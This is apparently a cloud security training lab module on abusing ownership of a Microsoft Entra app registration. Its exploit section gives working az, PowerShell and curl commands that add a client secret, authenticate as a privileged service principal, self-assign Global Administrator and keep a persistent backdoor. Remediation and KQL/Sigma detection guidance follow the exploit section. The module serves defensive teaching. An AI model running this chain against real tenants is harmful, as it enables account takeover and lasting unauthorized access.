# AP04 — App Registration credential abuse and Service Principal persistence

**Layer:** Identity (Microsoft Entra ID) · identity-only  
**Cost:** ~$0 (one app registration + its service principal; Entra ID Free is enough, unlike AP03 which requires P1)  
**MITRE ATT&CK:** [T1098.001](https://attack.mitre.org/techniques/T1098/001/) (Account Manipulation: Additional Cloud Credentials — *core*) · [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation: Additional Cloud Roles) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts) · [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation — parent technique) · [T1087.004](https://attack.mitre.org/techniques/T1087/004/) (Account Discovery: Cloud Account)  
**Maps to cert:** CARTP / CARTE (canonical chain *app-owner → add secret → directory role assignment*; abuse of tier-0 Graph application permissions and service principal persistence) · CRTE (identity abuse and directory escalation) · cloud persistence angle aligned with CRTO. Adjacent defensive side: SC-300, AZ-500.  
**Precondition seeded by the range:** the app registration `azrange-ap04-GraphSyncEngine`, its service principal, and the **admin consent** of the Graph application permission `RoleManagement.ReadWrite.Directory` (`9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8`, `AdminConsentRequired = Yes`) on that SP, with `azrange-user1` (a **low-privilege** user, with no directory role) as the **sole owner** of the app and the SP. The principal that runs `terraform apply` needs **Global Administrator** or **Privileged Role Administrator** to grant that admin consent declaratively (Application Administrator + Cloud Application Administrator are **NOT** enough to consent to a sensitive role-management permission). **What is NOT seeded** (and is the exploitable part): the owner adds credentials to the app — **default** Entra behavior, performed by the student.

---

## 🎯 Learning objective

Demonstrate the **canonical App Registration ownership abuse chain**: a low-privilege user who is the *owner* of an application whose service principal carries a tier-0 Microsoft Graph application permission can, **with no directory role at all**, add their own credentials to that app, authenticate as the privileged SP, and self-promote to **Global Administrator** in a single hop.

The AP cleanly separates two planes that are often conflated:

1. **Exploitable primitive (not seeded).** By default in Entra, the owner of an application manages its `passwordCredentials`/`keyCredentials` (`microsoft.directory/applications/credentials/update` is delegated to owners). Adding a secret is therefore legitimate platform behavior — seeding it would misrepresent the lab. It is performed by the student.
2. **Permission precondition (seeded, declared).** The admin consent of the dangerous app role. This is not "magic vulnerable state": it is a permission grant that in the real world someone with GA/PRA approved, and here is expressed 100% as code with `azuread_app_role_assignment`.

**Contrast with AP03 (same class, different object).** AP03 abuses the *ownership of a role-assignable group* — the owner self-adds to the group and **inherits** the directory role assigned to that group. AP04 abuses the *ownership of an App Registration* — the owner inherits nothing: they add **credentials** and directly exercise the SP's **Graph application permission**. Both are *ownership abuse* in Entra; AP03 operates on a `group` object, AP04 on an `application`/`servicePrincipal` object and its credential + app role surface.

---

## 🔴 Exploit (how it is exploited)

> Authorized training lab, own test tenant. All steps run as `azrange-user1` (low privilege) except where noted.

### 1. Recon — enumerate objects I own (T1087.004)

Interactive authentication of the low-privilege user and enumeration of owned apps:

```bash
az login --allow-no-subscriptions

# Apps that azrange-user1 owns
az rest --method GET \
  --url 'https://graph.microsoft.com/v1.0/me/ownedObjects/microsoft.graph.application?$select=id,appId,displayName'
```

Equivalents:

```powershell
Connect-MgGraph -Scopes "User.Read"      # minimal delegated
Get-MgUserOwnedObject -UserId (Get-MgContext).Account |
  Where-Object { $_.AdditionalProperties['@odata.type'] -eq '#microsoft.graph.application' }
```

Confirm that the SP of `azrange-ap04-GraphSyncEngine` carries the dangerous admin-consented app role (resourceId = Microsoft Graph SP):

```bash
az rest --method GET \
  --url 'https://graph.microsoft.com/v1.0/servicePrincipals/<spObjectId>/appRoleAssignments'
# Look for appRoleId == 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8 (RoleManagement.ReadWrite.Directory)
```

With an attack graph: **AzureHound → BloodHound** shows the `AZOwns` edge from `azrange-user1` over the app and the `AZMGRoleManagement_ReadWrite_Directory` capability over the SP. **ROADtools** (`roadrecon gather` + plugin) or **AADInternals** work equally well for the mapping.

### 2. Credential abuse — add a client secret as owner (T1098.001, *not seeded = Entra default*)

```bash
# Adds (does not replace) a secret to the app
az ad app credential reset --id <appId> --append --display-name "svc-rotation" --years 2
# -> returns appId, password (the secret), tenant
```

Equivalents:

```powershell
Add-MgApplicationPassword -ApplicationId <objectId> `
  -PasswordCredential @{ displayName = 'svc-rotation'; endDateTime = (Get-Date).AddYears(2) }
```

```bash
az rest --method POST \
  --url 'https://graph.microsoft.com/v1.0/applications/<objectId>/addPassword' \
  --body '{"passwordCredential":{"displayName":"svc-rotation"}}'
```

Certificate variant (`addKey` / `keyCredentials`) via **AADInternals** or **roadtx** if a lower footprint in `passwordCredentials` is desired. Save `clientId`, `tenantId` and the secret.

### 3. Authenticate as the Service Principal (T1078.004)

`client_credentials` grant — **app-only** Graph token carrying `RoleManagement.ReadWrite.Directory`:

```bash
az login --service-principal -u <appId> -p <secret> --tenant <tenantId> --allow-no-subscriptions
```

Or raw (useful for scripting and for re-issuing after propagation latency):

```bash
curl -s -X POST "https://login.microsoftonline.com/<tenantId>/oauth2/v2.0/token" \
  -d 'grant_type=client_credentials' \
  -d 'client_id=<appId>' \
  -d 'client_secret=<secret>' \
  -d 'scope=https://graph.microsoft.com/.default'
```

> **Propagation caveat.** The consent/credential may take time to be reflected in the app-only token. Retry / re-issue the token if `roleAssignments` returns `403` on the first attempt.

### 4. Escalation — self-assign Global Administrator (T1098.003 → T1078.004)

With the SP token, create a Global Administrator `unifiedRoleAssignment` on a controlled principal (the SP itself or `azrange-user1`):

```bash
curl -s -X POST "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  -H "Authorization: Bearer <sp_access_token>" \
  -H "Content-Type: application/json" \
  -d '{
        "principalId": "<SP_or_azrange-user1_objectId>",
        "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
        "directoryScopeId": "/"
      }'
```

`RoleManagement.ReadWrite.Directory` allows assigning **any** directory role, Global Administrator included, **directly and in a single hop** — it does not require an intermediate step through Privileged Role Administrator (`e8611ab8-c189-46e8-94e1-60213ab1f814` remains as an alternative). It is one of the only two Graph app roles that *guarantee* escalation to GA (the other is `AppRoleAssignment.ReadWrite.All`).

### 5. Tenant takeover

Now as Global Administrator: create/reset users, modify Conditional Access policies, read any resource, pivot to Azure RM by elevating access (`/providers/Microsoft.Authorization/elevateAccess`).

### 6. Persistence (T1098.001 at scale)

> **Persistence note.** The client secret/cert added in step 2 remains as an **app-only backdoor** of the privileged SP: it **survives a password reset of `azrange-user1`** and **MFA** (service principals do not enforce it), with a TTL set by the attacker (up to ~2 years). Removing the user from the tenant does not revoke the credential. Optional second layer: once GA, add more credentials/owners to other apps (`T1098` *Add owner to application*) or create hidden `roleAssignments`.

### Equivalent tier-0 variants (teaching note)

If the vulnerable SP carried, instead of `RoleManagement.ReadWrite.Directory`, any of these Graph app roles, tenant takeover would be equally viable:

- **`AppRoleAssignment.ReadWrite.All`** (`06b708a9-e830-4db3-a914-8e69da51d44f`) — **self-promotes**: the SP can grant itself other app roles (including `RoleManagement.ReadWrite.Directory`) and from there reach GA. It is the second app role that guarantees GA, but it adds hops (an intermediate self-grant) and Microsoft has progressively hardened it.
- **`Application.ReadWrite.All`** (`1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9`) — second layer of **credential persistence**: it allows adding secrets/owners to *other* apps in the tenant, including apps that already carry tier-0 permissions.

AP04 chooses `RoleManagement.ReadWrite.Directory` precisely because it is the **deterministic single-hop chain**, without depending on intermediate self-grants or on the existence of another privileged principal.

---

## 🟢 Remediate (remediation)

1. **Re-audit ownership of privileged apps/SPs.** No low-privilege user should own an app whose SP carries `RoleManagement.ReadWrite.Directory` (or another tier-0 app role). Enumerate and fix:
   ```powershell
   Get-MgApplication -All | ForEach-Object {
     $o = Get-MgApplicationOwner -ApplicationId $_.Id
     [pscustomobject]@{ App = $_.DisplayName; Owners = ($o.AdditionalProperties.userPrincipalName -join ',') }
   }
   Remove-MgApplicationOwnerByRef -ApplicationId <objectId> -DirectoryObjectId <ownerId>
   ```
   In the lab: `./azrange.ps1 reset` (re-applies with `enable_ap04 = false`, `count = 0`, destroys the app, the SP and the `azuread_app_role_assignment`).

2. **Treat tier-0 Graph app roles as what they are.** `RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All` and `Application.ReadWrite.All` are equivalent to Global Administrator. Inventory which SPs carry them (`Get-MgServicePrincipalAppRoleAssignment` on the Graph SP), remove the unnecessary ones, and require GA approval to grant them.

3. **Restrict credential addition by owners.** Apply **App Management Policies** (Microsoft Entra *application authentication methods policy*): block `passwordCredentials`, require short-lived certificates, limit who manages credentials. This hardens exactly the default primitive (*owner-add-creds*) that enables AP04 — also documented as caveat (b) below.

4. **Eliminate static secrets.** Prefer **workload identity federation** / **managed identities** over client secrets; rotate and inventory SP credentials; apply **Conditional Access for workload identities**; periodic `accessReviews` over app owners and over SPs with Graph app roles.

5. **Monitor the chain in AuditLogs** (see next section), prioritizing events whose `InitiatedBy` is a low-privilege user.

6. **Alert on the app-only self-grant.** Any creation of a Global Administrator / Privileged Role Administrator `roleAssignment` whose `InitiatedBy` is a **service principal** (not an interactive admin) is the direct signature of this technique.

---

## 🔵 Detect

Detection rules included in the range:

- KQL (Microsoft Sentinel / Advanced Hunting): [`../../detections/kql/AP04-app-credential-abuse.kql`](../../detections/kql/AP04-app-credential-abuse.kql)
- Sigma: [`../../detections/sigma/AP04-app-credential-abuse.yml`](../../detections/sigma/AP04-app-credential-abuse.yml)

**Signals (Entra `AuditLogs` table):**

| Signal | `OperationName` | What to look for |
|---|---|---|
| Secret/cert added by the owner (T1098.001) | `Update application – Certificates and secrets management` · `Update application` · `Add service principal credentials` (only if the credential is added directly to the SP) | `InitiatedBy` = **non-admin** user; `TargetResources` = the app; `ModifiedProperties` with `KeyDescription`/`passwordCredentials` added |
| Admin consent of the dangerous app role (precondition) | `Add app role assignment to service principal` | `TargetResources` includes the Graph app role (`9e3f62cf-...`) |
| Owner added to the app (precondition / persistence) | `Add owner to application` | unusual `InitiatedBy`; low-privilege owner |
| Directory role self-grant by an SP (escalation) | `Add member to role` | `InitiatedBy` = **service principal**; role = Global Administrator / Privileged Role Administrator |

Actual columns used by the rules: `OperationName`, `InitiatedBy`, `TargetResources`, `Result`, `ModifiedProperties`. The highest-value correlation is the **sequence**: `Update application – Certificates and secrets management` (credential added) by a low-privilege user → within minutes → `Add member to role` (Global Administrator) `InitiatedBy` an SP.

---

## 📚 References

- MITRE ATT&CK — [T1098.001](https://attack.mitre.org/techniques/T1098/001/), [T1098.003](https://attack.mitre.org/techniques/T1098/003/), [T1078.004](https://attack.mitre.org/techniques/T1078/004/), [T1098](https://attack.mitre.org/techniques/T1098/), [T1087.004](https://attack.mitre.org/techniques/T1087/004/)
- SpecterOps — *Azure Privilege Escalation via Service Principal Abuse* / Graph app roles that guarantee Global Administrator (`RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`)
- Merill Fernando — [graphpermissions.merill.net · RoleManagement.ReadWrite.Directory](https://graphpermissions.merill.net/permission/RoleManagement.ReadWrite.Directory) (app role `9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8`, delegated `d01b97e9-cbc0-49fe-810a-750afd5527a3`, `AdminConsentRequired = Yes` — validated 2026-11-14)
- Microsoft Learn — *App registration owners*, *Application authentication methods policy (App Management Policies)*, *roleManagement/directory/roleAssignments*, *Workload identity federation*, *Conditional Access for workload identities*
- Microsoft Learn — *Microsoft Graph permissions reference* (resource app id `00000003-0000-0000-c000-000000000000`); roleTemplateId Global Administrator `62e90394-69f5-4237-9190-012177145e10`
- Tools: ROADtools (`roadrecon`/`roadtx`), AADInternals, AzureHound / BloodHound, Microsoft Graph PowerShell SDK, `az` CLI
- Compare with [AP03](./AP03-role-assignable-group.md) — ownership abuse over a role-assignable **group** (role inheritance) vs. AP04, ownership abuse over an **App Registration** (credentials + Graph app role)
